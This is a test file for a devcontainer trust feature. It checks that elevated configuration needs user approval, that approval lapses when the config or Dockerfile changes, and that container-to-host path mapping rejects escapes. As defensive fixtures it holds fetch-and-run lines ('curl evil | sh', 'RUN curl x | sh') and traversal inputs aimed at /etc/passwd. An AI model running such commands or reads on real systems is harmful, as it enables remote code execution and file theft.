import { expect, test } from "vite-plus/test";
import { mkdtemp, mkdir, writeFile, readFile, symlink, rm } from "node:fs/promises";
import { join } from "node:path";
import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { classifyDevcontainer } from "../core/modules/devcontainer/index.ts";
import {
  decideDevcontainer,
  devcontainerLaunch,
  devcontainerState,
} from "../server/modules/devcontainer/index.ts";

const ids = (config) => classifyDevcontainer(config).map((finding) => finding.id);

test("only elevated capabilities need a trust decision", () => {
  expect(
    ids({ image: "node:24", forwardPorts: [3000], containerEnv: { A: "1" }, remoteUser: "node" }),
  ).toStrictEqual([]);
  expect(ids({ initializeCommand: "make host", features: { "ghcr.io/x/y:1": {} } })).toStrictEqual([
    "initialize-command",
    "features",
  ]);
  expect(
    ids({ build: { dockerfile: "Dockerfile" }, runArgs: ["--privileged"], mounts: ["a"] }).sort(),
  ).toStrictEqual(["build", "mounts", "run-args"]);
  expect(ids({ postCreateCommand: ["npm", "i"], remoteUser: "root" })).toStrictEqual([
    "lifecycle",
    "root-user",
  ]);
  expect(ids({ privileged: false, capAdd: [], mounts: [] })).toStrictEqual([]);
  expect(ids(null)).toStrictEqual([]);
});

const roots = [];
async function fixture(config) {
  const root = await mkdtemp(join(tmpdir(), "projector-devcontainer-"));
  roots.push(root);
  process.env.XDG_DATA_HOME = join(root, "data");
  const path = join(root, "repo");
  await mkdir(join(path, ".devcontainer"), { recursive: true });
  await writeFile(join(path, ".devcontainer", "devcontainer.json"), config);
  return { root, path, project: { id: "p", name: "repo", path } };
}
const JSONC = `{
  // JSONC: comments and trailing commas are valid here
  "name": "demo",
  "image": "node:24-bookworm",
  "initializeCommand": "echo host",
}`;

test("trust is bound to the exact configuration and falls back when it changes", async () => {
  const { path, project } = await fixture(JSONC);
  let state = devcontainerState(project);
  expect(state.found).toBe(true);
  expect(state.name).toBe("demo");
  expect(state.needsDecision).toBe(true);
  expect(devcontainerLaunch(project, { kind: "interactive" })).toBe(undefined);

  await expect(decideDevcontainer(project, "trusted", "not-the-shown-hash")).rejects.toThrow(
    /изменилась/,
  );
  state = await decideDevcontainer(project, "trusted", state.hash);
  expect(state.decision).toBe("trusted");
  expect(state.needsDecision).toBe(false);
  const launch = devcontainerLaunch(project, { kind: "command", command: "echo 'q'" });
  expect(launch.file).toBe(process.execPath);
  expect(launch.args.slice(-3)).toStrictEqual(["/bin/bash", "-c", "echo 'q'"]);
  expect(launch.args[2]).toMatch(/\bup\b[\s\S]*\bexec\b/);

  // Editing the config after the decision revokes it until the user decides again.
  await writeFile(
    join(path, ".devcontainer", "devcontainer.json"),
    JSONC.replace("echo host", "curl evil | sh"),
  );
  state = devcontainerState(project);
  expect(state.stale).toBe(true);
  expect(state.decision).toBe(null);
  expect(state.needsDecision).toBe(true);
  expect(devcontainerLaunch(project, { kind: "interactive" })).toBe(undefined);

  state = await decideDevcontainer(project, "declined", state.hash);
  expect(state.decision).toBe("declined");
  expect(state.needsDecision).toBe(false);
  expect(devcontainerLaunch(project, { kind: "interactive" })).toBe(undefined);

  state = await decideDevcontainer(project, "forget");
  expect(state.decision).toBe(null);
});

test("devcontainer host wrapper preserves argv, exit codes and stops after an up failure", async () => {
  const { root, project } = await fixture(JSONC);
  await decideDevcontainer(project, "trusted", devcontainerState(project).hash);
  const cli = join(root, "fake CLI с пробелами.cjs");
  const log = join(root, "calls.jsonl");
  await writeFile(
    cli,
    `
    const { appendFileSync } = require("node:fs");
    appendFileSync(process.env.CALL_LOG, JSON.stringify(process.argv.slice(2)) + "\\n");
    process.exit(process.argv[2] === "up" ? Number(process.env.UP_EXIT || 0) : 7);
  `,
  );
  const launch = devcontainerLaunch(project, { kind: "command", command: "echo 'quoted'; $value" });
  const args = [...launch.args];
  args[3] = cli;
  const env = { ...process.env, CALL_LOG: log };
  const result = spawnSync(launch.file, args, { env, encoding: "utf8" });
  expect(result.status, result.stderr).toBe(7);
  const calls = (await readFile(log, "utf8")).trim().split("\n").map(JSON.parse);
  expect(calls.map((call) => call[0])).toStrictEqual(["up", "exec"]);
  expect(calls[1].slice(-3)).toStrictEqual(["/bin/bash", "-c", "echo 'quoted'; $value"]);
  await writeFile(log, "");
  expect(spawnSync(launch.file, args, { env: { ...env, UP_EXIT: "9" } }).status).toBe(9);
  expect(
    (await readFile(log, "utf8"))
      .trim()
      .split("\n")
      .map(JSON.parse)
      .map((call) => call[0]),
  ).toStrictEqual(["up"]);
});

test("a changed Dockerfile also invalidates trust", async () => {
  const { path, project } = await fixture(JSON.stringify({ build: { dockerfile: "Dockerfile" } }));
  await writeFile(join(path, ".devcontainer", "Dockerfile"), "FROM node:24\n");
  const first = devcontainerState(project);
  await decideDevcontainer(project, "trusted", first.hash);
  expect(devcontainerLaunch(project, { kind: "interactive" })).toBeTruthy();
  await writeFile(join(path, ".devcontainer", "Dockerfile"), "FROM node:24\nRUN curl x | sh\n");
  expect(devcontainerState(project).decision).toBe(null);
  expect(devcontainerLaunch(project, { kind: "interactive" })).toBe(undefined);
});

test("a config symlinked out of the project is ignored", async () => {
  const { root, path } = await fixture("{}");
  const other = join(root, "outside.json");
  await writeFile(other, JSON.stringify({ initializeCommand: "x" }));
  const linked = join(root, "linked");
  await mkdir(linked);
  await symlink(other, join(linked, ".devcontainer.json"));
  expect(devcontainerState({ id: "l", name: "l", path: linked }).found).toBe(false);
  expect(devcontainerState({ id: "p", name: "p", path }).found).toBe(true);
});

test("projects without a config have nothing to decide", async () => {
  const root = await mkdtemp(join(tmpdir(), "projector-devcontainer-"));
  roots.push(root);
  const state = devcontainerState({ id: "n", name: "n", path: root });
  expect(state.found).toBe(false);
  expect(state.needsDecision).toBe(false);
  await expect(
    decideDevcontainer({ id: "n", name: "n", path: root }, "trusted", "x"),
  ).rejects.toThrow(/нет devcontainer/);
});

const { containerToHost } = await import("../server/modules/terminal/link-files.ts");
test("terminal links map container paths into the project and refuse escapes", () => {
  const map = (path) =>
    containerToHost(path, "/workspaces/app", "/home/me/app").replaceAll("\\", "/");
  expect(map("/workspaces/app/src/a.ts")).toBe("/home/me/app/src/a.ts");
  expect(map("src/a.ts")).toBe("/home/me/app/src/a.ts");
  expect(map("/workspaces/app")).toBe("/home/me/app");
  expect(() => map("/etc/passwd")).toThrow(/вне проекта/);
  expect(() => map("~/x")).toThrow(/вне проекта/);
  expect(() => map("/workspaces/app/../../etc/passwd")).toThrow(/за пределы/);
  expect(() => map("../secret")).toThrow(/за пределы/);
  expect(() => map("/workspaces/application/x")).toThrow(/вне проекта/);
});

await Promise.all(roots.map((root) => rm(root, { recursive: true, force: true })));
